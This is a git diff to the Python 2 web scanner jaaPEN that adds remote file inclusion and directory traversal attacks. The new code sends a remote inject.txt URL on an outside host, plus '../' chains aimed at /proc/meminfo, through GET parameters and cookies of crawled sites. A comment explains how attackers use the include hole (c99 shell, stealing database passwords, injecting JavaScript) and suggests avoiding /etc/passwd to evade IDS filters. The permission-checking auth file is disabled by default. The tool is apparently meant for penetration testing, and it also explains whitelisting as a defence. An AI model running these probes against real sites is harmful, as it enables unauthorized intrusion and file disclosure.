@@ -26,6 +26,7 @@
 # https://github.com/Gammelbob/jaaPEN
 #
 # Changelog:
+# 0.1.2 - added basic GET and COOKIE file inclusion and directory attacks
 # 0.1.1 - rewritten var type evaluating
 # 0.1.0 - some small fixes
 # 0.0.9 - added basic var type (integer, boolean, string) evaluating
@@ -38,6 +39,7 @@
 # 0.0.2 - added basic crawling and blacklisting
 # 0.0.1 - initial commit
 #
+#2do: linkhandling needs to be rewritten
 #2do: remove all general exceptions
 #2do: db-qry replace % with ?
 #2do: crawl, scanform, scancookies are almost identical. should be merged.
@@ -63,7 +65,7 @@ try:
 except ImportError:
     import sqlite3 as sqlite
 
-version = '0.1.1'
+version = '0.1.2'
 showResults = True
 saveResults = False
 
@@ -79,6 +81,8 @@ castCheck = True            # try to determine value types
 castCheckMinResults = 1     # castCheck is successful if at least castCheckMinResults could be casted.
                             # change this to 2 or even more to show only reliable results.
 filterExternal = True       # you should _really_ not disable this setting !
+authCheck = False
+crackCheck = True
 
 try:
     if sys.argv[1] == 'version' or sys.argv[1] == '-version' or sys.argv[1] == '--version':
@@ -155,6 +159,36 @@ if scanForms:
 if scanCookies:
     cookieRegex = re.compile('Set-Cookie: (.*?);')
 
+if openURL and authCheck:
+    myRandomKey = 'notThatRandom'   #2do: should be randomzied. we need to know this val after runtime.
+    getVarName = 'D26C2A'           #2do: should be randomzied. we need to know this val after runtime.
+    getVarVal = 'B208CF'            #2do: should be randomzied. we need to know this val after runtime.
+    reCheckVal = '3CF4E1'           #2do: should be randomzied. no need to be saved after runtime.
+    print '# checking auth file'
+    try: response = urllib2.urlopen('%sjaaPEN.php?%s=%s' % (firstCrawl, getVarName, getVarVal))
+    except urllib2.HTTPError, urllib2.URLError:
+        print 'no authfile found'
+        print 'do not scan websites without permission!'
+        print 'if you have access to the webdir save this as jaaPEN.php in %s:' % (firstCrawl)
+        print '<?php if(isset($_GET[\'%s\']) && $_GET[\'%s\'] == \'%s\') { echo \'%s\'; } ?>' % (getVarName, getVarName, getVarVal, myRandomKey)
+        exit()
+    print '# auth file found. checking content'
+    msg = response.read()
+    if myRandomKey in msg:
+        try: response = urllib2.urlopen('%sjaaPEN.php?%s=%s' % (firstCrawl, getVarName, reCheckVal))
+        except urllib2.HTTPError, urllib2.URLError:
+            print 'uh?'
+            exit()
+        msg = response.read()
+        if myRandomKey in msg:
+            print 'improper jaaPEN file found'
+            print 'do not scan websites without permission!'
+            exit()
+    else:
+        print 'found an auth file but the content does not match'
+        print 'do not scan websites without permission!'
+        exit()
+
 try:
     print '# loading previous results from db'
     # refresh our local vars [baselink][type][key][value]['myID']
@@ -171,7 +205,6 @@ try:
                     storage[baselinkRow[1]][typeRow[0]][keyRow[1]][valueRow[1]]['myID'] = valueRow[0]
 except:
     print '# loading previous results from DB failed. guessing new table or in-memory DB'
-
 print '# started crawling for scanID %i' % scanID
 jobtime = time.time()
 while True:
@@ -365,7 +398,7 @@ while True:
                             else:
                                 print '\tchecked: %i\t\t[%s][%s][%s]' % (count, baselinkRow[1], typeRow[0], keyRow[1])
                             for castErrorRow in cursor.execute("SELECT castErrorValue FROM `castErrors` WHERE keyID = %i" % keyRow[0]).fetchall():
-                                print '\t\t\t\t=> could not cast "%s" to %s' % (castErrorRow[0], castTypeRow[1]) 
+                                print '\t\t\t\t\t=> could not cast "%s" to %s' % (castErrorRow[0], castTypeRow[1]) 
 
         print '######'
         print '#  crawled pages\t%i in ~%s seconds' % (len(crawled),jobtime)
@@ -380,6 +413,208 @@ while True:
         print '#  found cookie-keys\t%i' % cntCookieKeys
         print '#  found cookie-values\t%i' % cntCookieValues
         print '######'
+
+        if crackCheck:
+            # first run: string
+            # could be vulunarable to a remote file injection or directory attack
+            # lets try to read /proc/meminfo
+            # if we are successful we get an 'MemTotal:' back
+            hackIn = '/proc/meminfo'
+            hackOut = 'MemTotal:'
+            directoryAttackMaxLevel = 10
+            #########################################################################
+            # The hole is normaly created by something like:
+            #
+            # <?php
+            #   include($_GET['page']);
+            # ?>
+            #
+            # This would allow an attacker to read any file which is readable by the
+            # owner of the webserverprocess: http://localhost/index.php?page=/proc/meminfo
+            # An attacker could also inject an own file like:
+            # http://localhost/index.php?page=http://attackersHost/inject.txt
+            # Everything in inject.txt will be parsed by http://localhosts PHP interpreter.
+            # This allows for example:
+            #   - loading more code like c99 shell
+            #   - using fopen to read db-passes
+            #   - inject malicous javascript in other php files and the database
+            # Injection of Javascript could lead to an infection of most of your visitors.
+            # Even its not an "malicous" javascript,the attacker could easily steal
+            # cookies from your visitors.
+            # An attacker could also inject flashfiles to exploit latest flash versions.
+            # You are in the responsibility to protect your visitors!
+            #
+            # Next step is to check if the given file exists on your filesystem which
+            # would stop remote injection:
+            # <?php
+            #   if(file_exists($_GET['page'])) {
+            #       include($_GET['page']);
+            #   }
+            # ?>
+            # But this means you can still type http://localhost/index.php?page=/proc/meminfo
+            # File exists and voila.
+            #
+            # Another version could be:
+            # <?php
+            #   if(file_exists($myBasedir . '/' . $_GET['page'])) {
+            #       include($myBasedir . '/' . $_GET['page']);
+            #   }
+            # ?>
+            # Which means you can provide something like http://localhost/index.php?page=../../proc/meminfo
+            # Lets assume we are at /var/www/index.php
+            # 1st ../ will change the path to /var/
+            # 2nd ../ will change the path to /
+            # /proc/meminfo exists and voila.
+            # As an attacker we do not know where the webroot is located on the server.
+            # We could get this information by producing errors with malformed paramters.
+            # Or by simply guessing up to 10 levels.
+            #
+            # We should not try to read /etc/passwd as we will get attention from an IDS
+            # or we get hit by small filter lists like ctracker.
+            # This is another example why value based blacklisting is bad.
+            # Whitelisting is way more secure:
+            # <?php
+            #   if($_GET['page'] == 'news') {
+            #       include('news.php');
+            #   }
+            # ?>
+            # You can also have an array of allowed userinputs (possibly created by an SQL query before)
+            # and ask if $_GET['page'] is in this array. If true include the associated file.
+            # If false do a header('Location: http://www.defense.gov/?i+am+a+bad+guy') ;-)
+            # Or maybe better, do a header('Location: http://localhost/logMe.php')
+            # At logMe.php you read the referer and do some small crackChecking like "\.'/
+            # If you find malicous content insert attackers IP in an IP based blacklist.
+            # Or if you control the server add his IP to your firewall.
+            # This way attackers will have no more (proxy)IPs sooner or later
+            # and "normal" errors are logged without blacklisting the users IP.
+            #########################################################################
+            sql = """
+                SELECT
+                    `baselinks`.baselink,
+                    `keys`.key
+                FROM
+                    `keys`,
+                    `baselinks`,
+                    `castTypes`,
+                    `keyCastResults`
+                WHERE
+                    `baselinks`.scanID = %i AND
+                    `keys`.baseID = `baselinks`.baseID AND
+                    `keyCastResults`.castTypeID = `castTypes`.castTypeID AND
+                    `keyCastResults`.keyID = `keys`.keyID AND
+                    `keys`.type = '%s' AND
+                    `castTypes`.castTypeValue = '%s'
+            """ % (scanID, 'GET', 'string')
+            # test remote file inclusion for GET
+            print '# testing remote file inclusion for GET'
+            for crackCheck in cursor.execute(sql).fetchall():
+                if crackCheck[0] in blacklist:
+                    continue
+                targetURL = '%s?%s=%s' % (crackCheck[0], crackCheck[1], 'http://stasiknecht.de/sourceofallevil/inject.txt')
+                try: response = urllib2.urlopen(targetURL)
+                except urllib2.HTTPError, e:
+                    print 'Error: %s while requesting "%s' % (e.code, targetURL)
+                    continue
+                except urllib2.URLError, e:
+                    print 'Error: %s while requesting "%s' % (e.reason, targetURL)
+                    continue
+                msg = response.read()
+                if hackOut in msg:
+                    print '[INCLUDE][remote][GET][%s]' % (targetURL)
+                    break
+            # test directory attack for GET
+            print '# testing directory attack for GET'
+            for crackCheck in cursor.execute(sql).fetchall():
+                if crackCheck[0] in blacklist:
+                    continue
+                i = 0
+                dirAttack = ''
+                while i <= directoryAttackMaxLevel:
+                    if i == 1: dirAttack = '..'
+                    elif i > 1: dirAttack = '%s%s' % (dirAttack, '/..')                     
+                    i += 1
+                    targetURL = '%s?%s=%s%s' % (crackCheck[0], crackCheck[1], dirAttack, hackIn)
+                    try: response = urllib2.urlopen(targetURL)
+                    except urllib2.HTTPError, e:
+                        print 'Error: %s while requesting "%s' % (e.code, targetURL)
+                        continue
+                    except urllib2.URLError, e:
+                        print 'Error: %s while requesting "%s' % (e.reason, targetURL)
+                        continue
+                    msg = response.read()
+                    if hackOut in msg:
+                        print '[INCLUDE][local][GET][%s]' % (targetURL)
+                        break
+
+            # now lets do the same for cookies
+            sql = """
+                SELECT
+                    `keys`.key
+                FROM
+                    `keys`,
+                    `castTypes`,
+                    `keyCastResults`
+                WHERE
+                    `keyCastResults`.castTypeID = `castTypes`.castTypeID AND
+                    `keyCastResults`.keyID = `keys`.keyID AND
+                    `keys`.type = '%s' AND
+                    `castTypes`.castTypeValue = '%s' AND
+                    `keys`.key != ''
+                GROUP BY
+                    `keys`.key""" % ('COOKIE', 'string')
+            basesql = """
+                SELECT
+                    `baselinks`.baselink
+                FROM
+                    `baselinks`
+                WHERE
+                    scanID = %i""" % scanID
+            # test remote file inclusion for COOKIE
+            print '# testing remote file inclusion for COOKIE'
+            for targetURL in cursor.execute(basesql).fetchall():
+                if targetURL[0] in blacklist:
+                    continue
+                for crackCheck in cursor.execute(sql).fetchall():
+                    opener = urllib2.build_opener()
+                    cookieVar = '%s=%s;' % (crackCheck[0],'http://stasiknecht.de/sourceofallevil/inject.txt')
+                    opener.addheaders.append(('Cookie', cookieVar))
+                    try: response = opener.open(targetURL[0])
+                    except urllib2.HTTPError, e:
+                        print '# Error: %s while requesting "%s' % (e.code, targetURL[0])
+                        continue
+                    except urllib2.URLError, e:
+                        print '# Error: %s while requesting "%s' % (e.reason, targetURL[0])
+                        continue
+                    msg = response.read()
+                    if hackOut in msg:
+                        print '[INCLUDE][remote][COOKIE][%s][%s]' % (cookieVar, targetURL[0])
+                        break
+            # test directory attack for COOKIE
+            print '# testing directory attack for COOKIE'
+            for targetURL in cursor.execute(basesql).fetchall():
+                if targetURL[0] in blacklist:
+                    continue
+                for crackCheck in cursor.execute(sql).fetchall():
+                    i = 0
+                    dirAttack = ''
+                    while i <= directoryAttackMaxLevel:
+                        if i == 1: dirAttack = '..'
+                        elif i > 1: dirAttack = '%s%s' % (dirAttack, '/..')                     
+                        i += 1
+                        opener = urllib2.build_opener()
+                        cookieVar = '%s=%s%s;' % (crackCheck[0], dirAttack, hackIn)
+                        opener.addheaders.append(('Cookie', cookieVar))
+                        try: response = opener.open(targetURL[0])
+                        except urllib2.HTTPError, e:
+                            print '# Error: %s while requesting "%s' % (e.code, targetURL[0])
+                            continue
+                        except urllib2.URLError, e:
+                            print '# Error: %s while requesting "%s' % (e.reason, targetURL[0])
+                            continue
+                        msg = response.read()
+                        if hackOut in msg:
+                            print '[INCLUDE][local][COOKIE][%s][%s]' % (cookieVar, targetURL[0])
+                            break
         # commit our changes which is only needed at a physical file, not at an in-memory database.
         connection.commit()
         connection.close()
@@ -391,16 +626,12 @@ while True:
         #2do: switch to non blocking sockets (which would cause the same problem). should be solved by 0.0.6 (reduced SELECTs).
         url = urlparse.urlparse(crawling)
         try: response = urllib2.urlopen(crawling)
-        except KeyboardInterrupt:
-            print '\nI got killed :o'
-            print 'saving database..'
-            connection.commit()
-            print 'closing connection..'
-            connection.close()
-            print 'please report bugs and issues @ https://github.com/Gammelbob/jaaPEN'
-            exit()
-        except: #2do: this needs to be changed to remove except KeyboardInterrupt above
-            print '# we got an error while requesting "%s"' % crawling
+        except urllib2.HTTPError, e:
+            print '# Error: %s while requesting "%s' % (e.code, crawling)
+            blacklist.add(crawling)
+            continue
+        except urllib2.URLError, e:
+            print '# Error: %s while requesting "%s' % (e.reason, crawling)
             blacklist.add(crawling)
             continue
         msg = response.read()
@@ -414,14 +645,18 @@ while True:
             # lets do some path fixing and blacklisting
             if not link.startswith('http'):
                 if link.startswith('/'):
-                    link = 'http://' + url[1] + link
+                    #link = 'http://' + url[1] + link
+                    link = sys.argv[1] + link
                 elif link.startswith('#'):
-                    link = 'http://' + url[1] + url[2] + link
+                    #link = 'http://' + url[1] + url[2] + link
+                    link = sys.argv[1] + link
                 elif ':' in link:
                     print '# found a weird link: ' + link
                     blacklist.add(link)
                     continue
-                else: link = 'http://' + url[1] + '/' + link
+                else:
+                    #link = 'http://' + url[1] + '/' + link
+                    link = firstCrawl + link
                 # recheck due linkfixing
                 if link in crawled or link in blacklist:
                     continue
@@ -488,16 +723,21 @@ while True:
             # lets do some path fixing and blacklisting
             if not formAction.startswith('http'):
                 if formAction.startswith('/'):
-                    formAction = 'http://' + url[1] + formAction
+                    #formAction = 'http://' + url[1] + formAction
+                    formAction = sys.argv[1] + formAction
                 elif formAction.startswith('#'):
-                    formAction = 'http://' + url[1] + url[2] + formAction
+                    #formAction = 'http://' + url[1] + url[2] + formAction
+                    formAction = firstCrawl + formAction
                 elif ':' in formAction:
                     print '# found a weird formAction: ' + formAction
                     print '# nevertheless, we turn on'
                     #blacklist.add(formAction)
                     #continue
                 else:
-                    formAction = 'http://' + url[1] + '/' + formAction
+                    #formAction = 'http://' + url[1] + '/' + formAction
+                    formAction = firstCrawl + formAction
+            if formAction in blacklist:
+                continue
             if not formAction.startswith(sys.argv[1]):
                 if filterExternal:
                     print '# found an external form target: ' + formAction
@@ -505,12 +745,10 @@ while True:
                     blacklist.add(formAction)
                     external.add(formAction)
                     continue
-            if formAction in blacklist:
-                continue
             if formAction not in crawled and formAction not in tocrawl:
                 # lets have a look what do we get if we request the forms target without any parameters
                 tocrawl.add(formAction)
-            # lets check if we already know the forms target/baselink
+            # lets check if we already know this forms target/baselink
             try: tmp = storage[formAction]['myID']
             except KeyError:
                 cursor.execute("INSERT INTO `baselinks` VALUES(NULL,%i,'%s')" % (scanID,formAction))
@@ -543,7 +781,6 @@ while True:
                     storage[formAction][formMethod][inputName][inputValue]['myID'] = cursor.lastrowid
 
     if scanCookies:
-        # response.info() returns the header
         header = str(response.info())
         cookies = cookieRegex.findall(header)
         try: baselink = response.geturl().split('?')[0]
@@ -560,6 +797,7 @@ while True:
             try: value = cookie.split('=')[1]
             except IndexError:
                 value = 'not/set'
+            # do we know this baselink
             try: tmp = storage[baselink]['myID']
             except KeyError:
                 cursor.execute("INSERT INTO `baselinks` VALUES(NULL,%i,'%s')" % (scanID,baselink))
